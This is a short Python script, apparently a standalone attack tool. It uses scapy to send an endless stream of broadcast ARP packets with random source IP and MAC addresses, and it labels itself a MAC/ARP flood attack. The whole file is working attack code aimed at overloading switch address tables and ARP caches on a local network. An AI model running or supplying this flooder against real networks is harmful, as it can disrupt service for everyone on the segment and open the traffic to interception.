from scapy.all import ARP, sendp, RandMAC, RandIP, Ether
from time import sleep

def flood():
    PACKET = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(psrc=RandIP(), hwsrc=RandMAC())
    sendp(PACKET, verbose=False)

print("[*] Starting MAC/ARP Flood attack... Press Ctrl+C to stop.")

try:
    while True:
        flood()
        sleep(0.1) # You can change, if you want
except KeyboardInterrupt:
    print("\n[!] Flood stopped.")
